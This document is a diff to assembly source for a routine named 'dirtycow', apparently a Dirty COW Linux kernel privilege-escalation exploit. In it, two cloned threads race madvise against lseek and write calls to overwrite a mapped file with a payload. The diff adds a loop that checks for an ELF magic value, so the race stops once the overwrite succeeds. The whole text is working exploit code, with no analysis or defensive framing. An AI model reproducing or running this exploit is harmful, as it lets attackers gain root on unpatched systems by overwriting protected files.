@@ -30,14 +30,22 @@ dirtycow:
   mov                                   qword [ .childs + 0 * __qword__ ],      sys0ret
   clone                                 .child1,                                rsp
   mov                                   qword [ .childs + 1 * __qword__ ],      sys0ret
+  mov                                   r15,                                    qword [ .filedesc ]
   @@:
-  nanosleep                             null,                                   ( 10 * 1000 * 1000 )
-  cmp                                   qword [ .childs + 0 * __qword__ ],      null
-  jnz                                   @b
-  @@:
-  nanosleep                             null,                                   ( 10 * 1000 * 1000 )
-  cmp                                   qword [ .childs + 1 * __qword__ ],      null
-  jnz                                   @b
+    nanosleep                           null,                                   ( 10 * MICROSECONDS )
+    null                                sys2arg
+    mov                                 sys1arg,                                ( rootelf64.unused - rootelf64 )
+    mov                                 sys0arg,                                r15
+    sys_call                            sys_lseek
+    mov                                 sys2arg,                                4
+    lea                                 sys1arg,                                [ .fstat.zero ]
+    ;sys_call                            sys_read
+    null                                rax
+    syscall
+    cmp                                 qword [ .childs + 0 * __qword__ ],      null
+    jnz                                 @b
+    cmp                                 qword [ .childs + 1 * __qword__ ],      null
+    jnz                                 @b
   ret
   .child0:
   ;{
@@ -50,8 +58,11 @@ dirtycow:
       mov                               sys0arg,                                r15
       sys_call                          sys_madvise
       lea                               r12,                                    [ r12 + sys0ret ]
+      cmp                               dword [ .fstat.zero ],                  rootelf64.magic
+      je                                @f
       dec                               rbx
-    jnz                                 @b
+      jnz                               @b
+    @@:
     mov                                 qword [ .childs + 0 * __qword__ ],      null
     sys_call                            sys_exit
   ;}
@@ -63,21 +74,22 @@ dirtycow:
     mov                                 r15,                                    sys0ret
     mov                                 r14,                                    qword [ .payload ]
     mov                                 r13,                                    qword [ .payload.length ]
-    null                                r12
-    mov                                 r10,                                    qword [ .map ]
+    mov                                 r12,                                    qword [ .map ]
     mov                                 rbx,                                    ( 8 * 1024 * 1024 * 1024 )
+    mov                                 sys0arg,                                sys0ret
     @@:
       null                              sys2arg
-      mov                               sys1arg,                                r10
+      mov                               sys1arg,                                r12
       mov                               sys0arg,                                r15
       sys_call                          sys_lseek
       mov                               sys2arg,                                r13
       mov                               sys1arg,                                r14
-      mov                               sys0arg,                                r15
       sys_call                          sys_write
-      lea                               r12,                                    [ r12 + sys0ret ]
+      cmp                               dword [ .fstat.zero ],                  rootelf64.magic
+      je                                @f
       dec                               rbx
-    jnz                                 @b
+      jnz                               @b
+    @@:
     mov                                 qword [ .childs + 1 * __qword__ ],      null
     sys_call                            sys_exit
   ;}
